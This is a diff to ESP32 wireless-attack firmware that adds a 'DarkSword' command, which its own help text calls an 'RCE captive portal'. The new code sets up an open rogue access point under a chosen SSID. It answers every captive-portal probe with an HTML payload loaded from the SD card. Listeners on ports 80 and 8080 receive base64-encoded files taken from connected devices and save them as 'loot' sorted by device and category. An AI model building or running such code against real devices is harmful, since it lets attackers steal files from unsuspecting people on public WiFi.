@@ -111,7 +111,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.5.7"
+#define JANOS_VERSION "1.5.8"
 
 #define OTA_GITHUB_OWNER "C5Lab"
 #define OTA_GITHUB_REPO "projectZero"
@@ -510,6 +510,15 @@ static volatile bool karma_mode_active = false;
 static volatile bool rogueap_mode_active = false;
 static TaskHandle_t dns_server_task_handle = NULL;
 static int dns_server_socket = -1;
+
+// DarkSword state
+static volatile bool darksword_active = false;
+static TaskHandle_t darksword_exfil_task_handle = NULL;
+static int darksword_exfil_socket = -1;
+static char *darksword_html = NULL;
+static size_t darksword_html_len = 0;
+static bool darksword_html_gzipped = false;
+
 static TaskHandle_t boot_button_task_handle = NULL;
 static TaskHandle_t boot_action_task_handle = NULL;
 
@@ -7762,6 +7771,37 @@ static int cmd_stop(int argc, char **argv) {
         }
     }
     
+    // Stop DarkSword if active
+    if (darksword_active) {
+        MY_LOG_INFO(TAG, "Stopping DarkSword...");
+        darksword_active = false;
+
+        // Stop exfil listener task
+        if (darksword_exfil_task_handle != NULL) {
+            if (darksword_exfil_socket >= 0) {
+                close(darksword_exfil_socket);
+                darksword_exfil_socket = -1;
+            }
+            for (int i = 0; i < 30 && darksword_exfil_task_handle != NULL; i++) {
+                vTaskDelay(pdMS_TO_TICKS(100));
+            }
+            if (darksword_exfil_task_handle != NULL) {
+                vTaskDelete(darksword_exfil_task_handle);
+                darksword_exfil_task_handle = NULL;
+                MY_LOG_INFO(TAG, "DarkSword exfil task force-deleted");
+            }
+        }
+
+        // Free HTML buffer
+        if (darksword_html != NULL) {
+            heap_caps_free(darksword_html);
+            darksword_html = NULL;
+            darksword_html_len = 0;
+            darksword_html_gzipped = false;
+        }
+        MY_LOG_INFO(TAG, "DarkSword stopped.");
+    }
+
     // Stop portal if active
     if (portal_active) {
         MY_LOG_INFO(TAG, "Stopping portal...");
@@ -10484,6 +10524,12 @@ static int cmd_ping(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_version(int argc, char **argv) {
+    (void)argc; (void)argv;
+    MY_LOG_INFO(TAG, "JanOS version: " JANOS_VERSION);
+    return 0;
+}
+
 static int cmd_led(int argc, char **argv) {
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Usage: led set <on|off> | led level <1-100> | led read");
@@ -12700,6 +12746,492 @@ static void dns_server_task(void *pvParameters) {
     vTaskDelete(NULL);
 }
 
+// ─── DarkSword helpers ───────────────────────────────────────────────
+
+// Load darksword.html from SD card into PSRAM
+static bool load_darksword_html(void) {
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "DS: SD card init failed: %s", esp_err_to_name(ret));
+        return false;
+    }
+
+    // Try gzipped version first — much smaller, faster to serve
+    const char *gz_path = "/sdcard/lab/htmls/darksword.html.gz";
+    const char *raw_path = "/sdcard/lab/htmls/darksword.html";
+    bool is_gz = false;
+
+    FILE *f = fopen(gz_path, "rb");
+    if (f) {
+        is_gz = true;
+        MY_LOG_INFO(TAG, "DS: Found gzipped file %s", gz_path);
+    } else {
+        f = fopen(raw_path, "r");
+        if (!f) {
+            MY_LOG_INFO(TAG, "DS: Cannot open %s or %s", gz_path, raw_path);
+            return false;
+        }
+    }
+
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (fsize <= 0 || fsize > 4 * 1024 * 1024) {
+        MY_LOG_INFO(TAG, "DS: File size invalid: %ld", fsize);
+        fclose(f);
+        return false;
+    }
+
+    if (darksword_html) {
+        heap_caps_free(darksword_html);
+        darksword_html = NULL;
+    }
+
+    darksword_html = (char *)heap_caps_malloc((size_t)fsize + 1, MALLOC_CAP_SPIRAM);
+    if (!darksword_html) {
+        MY_LOG_INFO(TAG, "DS: PSRAM alloc failed (%ld bytes)", fsize);
+        fclose(f);
+        return false;
+    }
+
+    size_t rd = fread(darksword_html, 1, (size_t)fsize, f);
+    darksword_html[rd] = '\0';
+    darksword_html_len = rd;
+    darksword_html_gzipped = is_gz;
+    fclose(f);
+    MY_LOG_INFO(TAG, "DS: Loaded %s (%u bytes, gzip=%d)",
+                is_gz ? gz_path : raw_path, (unsigned)rd, is_gz);
+    return true;
+}
+
+// HTTP handler: serve darksword HTML with chunked transfer (2+ MB)
+static esp_err_t darksword_page_handler(httpd_req_t *req) {
+    if (!darksword_html || darksword_html_len == 0) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "HTML not loaded");
+        return ESP_FAIL;
+    }
+
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
+    if (darksword_html_gzipped) {
+        httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
+    }
+
+    // With gzip (~50-150 KB) the transfer is much faster and more reliable
+    const size_t chunk = 4096;
+    size_t sent = 0;
+    while (sent < darksword_html_len) {
+        size_t remaining = darksword_html_len - sent;
+        size_t to_send = remaining < chunk ? remaining : chunk;
+        esp_err_t err = httpd_resp_send_chunk(req, darksword_html + sent, to_send);
+        if (err != ESP_OK) {
+            MY_LOG_INFO(TAG, "DS: chunk send error at offset %u", (unsigned)sent);
+            httpd_resp_send_chunk(req, NULL, 0);
+            return ESP_FAIL;
+        }
+        sent += to_send;
+    }
+    httpd_resp_send_chunk(req, NULL, 0);
+    return ESP_OK;
+}
+
+// Save one exfiltrated file to /sdcard/loot/portal/<category>/<filename>
+static void darksword_save_loot(const char *json_body, size_t json_len) {
+    cJSON *root = cJSON_ParseWithLength(json_body, json_len);
+    if (!root) {
+        MY_LOG_INFO(TAG, "DS loot: JSON parse failed");
+        return;
+    }
+
+    const cJSON *j_path = cJSON_GetObjectItem(root, "path");
+    const cJSON *j_cat  = cJSON_GetObjectItem(root, "category");
+    const cJSON *j_data = cJSON_GetObjectItem(root, "data");
+    const cJSON *j_uuid = cJSON_GetObjectItem(root, "deviceUUID");
+
+    if (!cJSON_IsString(j_path) || !cJSON_IsString(j_data)) {
+        MY_LOG_INFO(TAG, "DS loot: missing path/data");
+        cJSON_Delete(root);
+        return;
+    }
+
+    const char *category = (cJSON_IsString(j_cat) && j_cat->valuestring[0])
+                            ? j_cat->valuestring : "misc";
+    const char *uuid_str = (cJSON_IsString(j_uuid) && j_uuid->valuestring[0])
+                            ? j_uuid->valuestring : "unknown";
+
+    // Build directory: /sdcard/loot/portal/<uuid>/<category>/
+    char dir[256];
+    snprintf(dir, sizeof(dir), "/sdcard/loot/portal/%s/%s", uuid_str, category);
+
+    // Recursive mkdir (up to 4 levels)
+    {
+        char tmp[256];
+        snprintf(tmp, sizeof(tmp), "%s", dir);
+        for (char *p = tmp + 1; *p; p++) {
+            if (*p == '/') {
+                *p = '\0';
+                mkdir(tmp, 0755);
+                *p = '/';
+            }
+        }
+        mkdir(tmp, 0755);
+    }
+
+    // Derive filename from path (last component)
+    const char *fname = strrchr(j_path->valuestring, '/');
+    fname = fname ? fname + 1 : j_path->valuestring;
+    if (!fname[0]) fname = "data.bin";
+
+    char filepath[320];
+    snprintf(filepath, sizeof(filepath), "%s/%s", dir, fname);
+
+    // Base64-decode data
+    const char *b64 = j_data->valuestring;
+    size_t b64_len = strlen(b64);
+    size_t decoded_len = 0;
+
+    // First pass: get decoded length
+    if (mbedtls_base64_decode(NULL, 0, &decoded_len, (const unsigned char *)b64, b64_len) != MBEDTLS_ERR_BASE64_BUFFER_TOO_SMALL && decoded_len == 0) {
+        MY_LOG_INFO(TAG, "DS loot: base64 length check failed");
+        cJSON_Delete(root);
+        return;
+    }
+
+    uint8_t *decoded = (uint8_t *)heap_caps_malloc(decoded_len, MALLOC_CAP_SPIRAM);
+    if (!decoded) {
+        decoded = (uint8_t *)malloc(decoded_len);
+    }
+    if (!decoded) {
+        MY_LOG_INFO(TAG, "DS loot: alloc %u failed", (unsigned)decoded_len);
+        cJSON_Delete(root);
+        return;
+    }
+
+    size_t olen = 0;
+    int rc = mbedtls_base64_decode(decoded, decoded_len, &olen,
+                                    (const unsigned char *)b64, b64_len);
+    if (rc != 0) {
+        MY_LOG_INFO(TAG, "DS loot: base64 decode error %d", rc);
+        free(decoded);
+        cJSON_Delete(root);
+        return;
+    }
+
+    FILE *f = fopen(filepath, "wb");
+    if (!f) {
+        MY_LOG_INFO(TAG, "DS loot: cannot write %s", filepath);
+        free(decoded);
+        cJSON_Delete(root);
+        return;
+    }
+    fwrite(decoded, 1, olen, f);
+    fflush(f);
+    fclose(f);
+    sd_sync();
+
+    MY_LOG_INFO(TAG, "DS loot: saved %s (%u bytes) [%s]", filepath, (unsigned)olen, category);
+    free(decoded);
+    cJSON_Delete(root);
+}
+
+// HTTP POST /stats handler — exfil data arriving on port 80
+static esp_err_t darksword_stats_handler(httpd_req_t *req) {
+    // Allow CORS preflight
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
+
+    if (req->method == HTTP_OPTIONS) {
+        httpd_resp_send(req, NULL, 0);
+        return ESP_OK;
+    }
+
+    int total = req->content_len;
+    if (total <= 0 || total > 2 * 1024 * 1024) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad length");
+        return ESP_FAIL;
+    }
+
+    char *body = (char *)heap_caps_malloc(total + 1, MALLOC_CAP_SPIRAM);
+    if (!body) body = (char *)malloc(total + 1);
+    if (!body) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
+        return ESP_FAIL;
+    }
+
+    int received = 0;
+    while (received < total) {
+        int r = httpd_req_recv(req, body + received, total - received);
+        if (r <= 0) {
+            free(body);
+            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Recv error");
+            return ESP_FAIL;
+        }
+        received += r;
+    }
+    body[received] = '\0';
+
+    darksword_save_loot(body, (size_t)received);
+    free(body);
+
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, "{\"status\":\"ok\"}", HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Raw TCP exfiltration listener on port 8080
+// Accepts connections, reads HTTP-like POST /stats, extracts JSON body
+static void darksword_exfil_task(void *pvParameters) {
+    (void)pvParameters;
+
+    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (listen_fd < 0) {
+        MY_LOG_INFO(TAG, "DS exfil: socket() failed");
+        darksword_exfil_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    darksword_exfil_socket = listen_fd;
+
+    int opt = 1;
+    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_port = htons(8080),
+        .sin_addr.s_addr = htonl(INADDR_ANY),
+    };
+
+    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        MY_LOG_INFO(TAG, "DS exfil: bind() failed");
+        close(listen_fd);
+        darksword_exfil_socket = -1;
+        darksword_exfil_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    if (listen(listen_fd, 2) < 0) {
+        MY_LOG_INFO(TAG, "DS exfil: listen() failed");
+        close(listen_fd);
+        darksword_exfil_socket = -1;
+        darksword_exfil_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    MY_LOG_INFO(TAG, "DS exfil: listening on port 8080");
+
+    while (darksword_active) {
+        struct sockaddr_in cli;
+        socklen_t cli_len = sizeof(cli);
+        int client_fd = accept(listen_fd, (struct sockaddr *)&cli, &cli_len);
+        if (client_fd < 0) {
+            if (!darksword_active) break;
+            vTaskDelay(pdMS_TO_TICKS(50));
+            continue;
+        }
+
+        // Set receive timeout
+        struct timeval tv = { .tv_sec = 10, .tv_usec = 0 };
+        setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+        // Read up to 2 MB
+        size_t buf_sz = 2 * 1024 * 1024;
+        char *buf = (char *)heap_caps_malloc(buf_sz, MALLOC_CAP_SPIRAM);
+        if (!buf) {
+            close(client_fd);
+            continue;
+        }
+
+        size_t total_read = 0;
+        while (total_read < buf_sz) {
+            int r = recv(client_fd, buf + total_read, buf_sz - total_read, 0);
+            if (r <= 0) break;
+            total_read += (size_t)r;
+            // Check if we got the full HTTP request (double CRLF + content-length worth of body)
+            if (total_read > 4) {
+                char *body_start = strstr(buf, "\r\n\r\n");
+                if (body_start) {
+                    body_start += 4;
+                    // Try to find Content-Length
+                    char *cl_hdr = strcasestr(buf, "Content-Length:");
+                    if (cl_hdr) {
+                        int cl = atoi(cl_hdr + 15);
+                        size_t hdr_len = (size_t)(body_start - buf);
+                        if (cl > 0 && total_read >= hdr_len + (size_t)cl) break;
+                    }
+                }
+            }
+        }
+        buf[total_read < buf_sz ? total_read : buf_sz - 1] = '\0';
+
+        // Send HTTP 200 response
+        const char *resp = "HTTP/1.1 200 OK\r\n"
+                           "Content-Type: application/json\r\n"
+                           "Access-Control-Allow-Origin: *\r\n"
+                           "Connection: close\r\n"
+                           "Content-Length: 15\r\n\r\n"
+                           "{\"status\":\"ok\"}";
+        send(client_fd, resp, strlen(resp), 0);
+        close(client_fd);
+
+        // Extract JSON body
+        char *body = strstr(buf, "\r\n\r\n");
+        if (body) {
+            body += 4;
+            size_t body_len = total_read - (size_t)(body - buf);
+            if (body_len > 0) {
+                darksword_save_loot(body, body_len);
+            }
+        }
+        heap_caps_free(buf);
+    }
+
+    if (darksword_exfil_socket >= 0) {
+        close(darksword_exfil_socket);
+        darksword_exfil_socket = -1;
+    }
+    MY_LOG_INFO(TAG, "DS exfil: task exiting");
+    darksword_exfil_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// ─── cmd_start_darksword ─────────────────────────────────────────────
+static int cmd_start_darksword(int argc, char **argv) {
+    oled_display_update_full("> DarkSword",
+        argc >= 2 ? argv[1] : "  No SSID",
+        "  RCE portal", "  Waiting...");
+    log_memory_info("start_darksword");
+
+    if (!ensure_wifi_mode()) return 1;
+
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_darksword <SSID>");
+        return 1;
+    }
+
+    if (portal_active || darksword_active) {
+        MY_LOG_INFO(TAG, "A portal is already running. Use 'stop' first.");
+        return 0;
+    }
+
+    const char *ssid = argv[1];
+    size_t ssid_len = strlen(ssid);
+    if (ssid_len == 0 || ssid_len > 32) {
+        MY_LOG_INFO(TAG, "SSID length must be 1-32");
+        return 1;
+    }
+
+    // Load HTML from SD
+    if (!load_darksword_html()) return 1;
+
+    // Store portal SSID
+    if (portalSSID) { free(portalSSID); portalSSID = NULL; }
+    portalSSID = strdup(ssid);
+
+    MY_LOG_INFO(TAG, "Starting DarkSword portal with SSID: %s", ssid);
+
+    // Enable AP
+    esp_netif_t *ap_netif = ensure_ap_mode();
+    if (!ap_netif) { MY_LOG_INFO(TAG, "DS: AP mode failed"); return 1; }
+
+    esp_netif_dhcps_stop(ap_netif);
+
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr      = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr      = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    esp_netif_set_ip_info(ap_netif, &ip_info);
+
+    wifi_config_t ap_cfg = {0};
+    memcpy(ap_cfg.ap.ssid, ssid, ssid_len);
+    ap_cfg.ap.ssid_len = ssid_len;
+    ap_cfg.ap.channel = 1;
+    ap_cfg.ap.max_connection = 4;
+    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+
+    esp_netif_dhcps_start(ap_netif);
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
+    // HTTP server config — increase max_uri_handlers and recv buffer for large POST
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.server_port = 80;
+    config.max_open_sockets = 4;
+    config.max_uri_handlers = 16;
+    config.recv_wait_timeout = 30;
+    config.send_wait_timeout = 30;
+    config.stack_size = 8192;
+
+    esp_err_t http_ret = httpd_start(&portal_server, &config);
+    if (http_ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "DS: HTTP server failed: %s", esp_err_to_name(http_ret));
+        return 1;
+    }
+
+    // Register darksword page on all captive-portal paths
+    const httpd_uri_t page_uris[] = {
+        { .uri = "/",                   .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/portal",             .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/hotspot-detect.html",.method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/generate_204",       .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/ncsi.txt",           .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/*",                  .method = HTTP_GET, .handler = darksword_page_handler },
+    };
+    for (int i = 0; i < sizeof(page_uris)/sizeof(page_uris[0]); i++) {
+        httpd_register_uri_handler(portal_server, &page_uris[i]);
+    }
+
+    // POST /stats on port 80 (backup path)
+    const httpd_uri_t stats_post = {
+        .uri = "/stats", .method = HTTP_POST, .handler = darksword_stats_handler
+    };
+    httpd_register_uri_handler(portal_server, &stats_post);
+
+    // OPTIONS /stats for CORS preflight
+    const httpd_uri_t stats_options = {
+        .uri = "/stats", .method = HTTP_OPTIONS, .handler = darksword_stats_handler
+    };
+    httpd_register_uri_handler(portal_server, &stats_options);
+
+    // RFC 8908 captive portal API
+    const httpd_uri_t api_uri = {
+        .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler
+    };
+    httpd_register_uri_handler(portal_server, &api_uri);
+
+    darksword_active = true;
+    portal_active = true;
+
+    // DNS server
+    BaseType_t dns_ret = xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5,
+                                     &dns_server_task_handle);
+    if (dns_ret != pdPASS) {
+        darksword_active = false;
+        portal_active = false;
+        httpd_stop(portal_server);
+        portal_server = NULL;
+        return 1;
+    }
+
+    // Exfil listener on port 8080
+    BaseType_t exfil_ret = xTaskCreate(darksword_exfil_task, "ds_exfil", 8192, NULL, 5,
+                                       &darksword_exfil_task_handle);
+    if (exfil_ret != pdPASS) {
+        MY_LOG_INFO(TAG, "DS: exfil task creation failed — port 80 /stats still available");
+    }
+
+    led_set_color(255, 0, 0); // Red for DarkSword
+
+    MY_LOG_INFO(TAG, "DarkSword portal active!");
+    MY_LOG_INFO(TAG, "  AP: %s  IP: 172.0.0.1", ssid);
+    MY_LOG_INFO(TAG, "  HTTP :80   Exfil :8080");
+    MY_LOG_INFO(TAG, "  Loot: /sdcard/loot/portal/");
+    return 0;
+}
+
 // Start portal command
 static int cmd_start_portal(int argc, char **argv) {
     oled_display_update_full("> Captive Portal",
@@ -14395,6 +14927,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
 
+    const esp_console_cmd_t darksword_cmd = {
+        .command = "start_darksword",
+        .help = "DarkSword RCE captive portal: start_darksword <SSID>. Serves /sdcard/lab/htmls/darksword.html, exfil on :8080, loot in /sdcard/loot/portal/",
+        .hint = "<SSID>",
+        .func = &cmd_start_darksword,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&darksword_cmd));
+
     const esp_console_cmd_t rogueap_cmd = {
         .command = "start_rogueap",
         .help = "Start WPA2 rogue AP with captive portal: start_rogueap <SSID> <password>. Requires select_html first. Runs deauth if networks selected.",
@@ -14701,6 +15242,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&scan_airtag_cmd));
+
+    const esp_console_cmd_t version_cmd = {
+        .command = "version",
+        .help = "Prints JanOS firmware version",
+        .hint = NULL,
+        .func = &cmd_version,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&version_cmd));
 }
 
 void app_main(void) {
@@ -14976,6 +15526,7 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  unselect_networks");
       MY_LOG_INFO(TAG,"  unselect_stations");
       MY_LOG_INFO(TAG,"  vendor set <on|off> | vendor read");
+      MY_LOG_INFO(TAG,"  version");
       MY_LOG_INFO(TAG,"  wifi_connect <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
       MY_LOG_INFO(TAG,"  wifi_disconnect");
       MY_LOG_INFO(TAG,"  wigle_key set <api_name> <api_token> | wigle_key read");
